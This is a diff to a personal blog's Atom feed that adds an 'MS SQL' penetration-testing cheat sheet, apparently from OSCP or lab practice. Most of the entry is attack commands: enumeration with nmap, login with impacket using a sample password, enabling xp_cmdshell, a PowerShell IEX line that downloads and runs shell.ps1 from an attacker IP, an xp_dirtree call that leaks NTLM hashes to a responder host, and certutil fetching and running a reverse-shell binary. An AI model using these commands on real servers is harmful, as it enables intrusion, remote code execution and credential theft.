@@ -4,13 +4,87 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-01-29T18:51:30+08:00</updated>
+ <updated>2022-01-30T14:36:03+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>MS SQL</title>
+   <link href="https://mvineza.github.io/spindel/2022/01/30/ms-sql"/>
+   <updated>2022-01-30T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/01/30/MS-SQL</id>
+   <content type="html">&lt;h2 id=&quot;ports&quot;&gt;Ports&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;1433/tcp&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;gathering-info&quot;&gt;Gathering info&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap&lt;/span&gt;
+nmap &lt;span class=&quot;nt&quot;&gt;-p1433&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;*ms-sql*&quot;&lt;/span&gt; 10.10.209.245
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;ways-of-logging-in&quot;&gt;Ways of logging in&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Using impacket&lt;/span&gt;
+impacket-mssqlclient ustoun.local/svc-kerb:superman@10.10.209.245
+
+&lt;span class=&quot;c&quot;&gt;# inside windows cli&lt;/span&gt;
+sqlcmd /S localhost &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;select @@version;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# others&lt;/span&gt;
+mssqlclient.py &lt;span class=&quot;nt&quot;&gt;-windows-auth&lt;/span&gt; &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;IP&amp;gt;
+mssqlclient.py &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;IP&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;sql-commands&quot;&gt;SQL Commands&lt;/h2&gt;
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;-- checks version&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@@&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;-- show databases&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;EXEC&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp_databases&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;-- checks if use has sysadmin privileges (1 means&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;-- sysadmin)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IS_SRVROLEMEMBER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sysadmin'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;-- enables xp_cmdshell&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;EXEC&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp_configure&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Show Advanced Options'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;reconfigure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sp_configure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;EXEC&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp_configure&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'xp_cmdshell'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;reconfigure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;xp_cmdshell&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;whoami&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;-- executes commands&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;xp_cmdshell&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;whoami&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;xp_cmdshell&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dir&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;-- make victim download from our machine (10.10.14.60)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;xp_cmdshell&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;powershell &quot;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IEX&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;New&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WebClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DownloadString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;http://10.10.14.60/shell.ps1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;);&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;-- Intercept NTLM hash of user (be sure to fire up&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;-- responder first)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;SQL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xp_dirtree&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;10.11.40.33&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;nything'&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;-- Transfer a reverse shell binary and execute it&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;xp_cmdshell&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;certutil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlcache&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SVC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Kerb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DC01&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;xp_cmdshell&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SVC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Kerb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DC01&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;files&quot;&gt;Files&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# may contain passwords, used for migration purposes&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.dtsConfig
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;others&quot;&gt;Others&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html#mssql---1433&quot;&gt;OSCP personal cheatsheet&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>NFS no_root_squash</title>
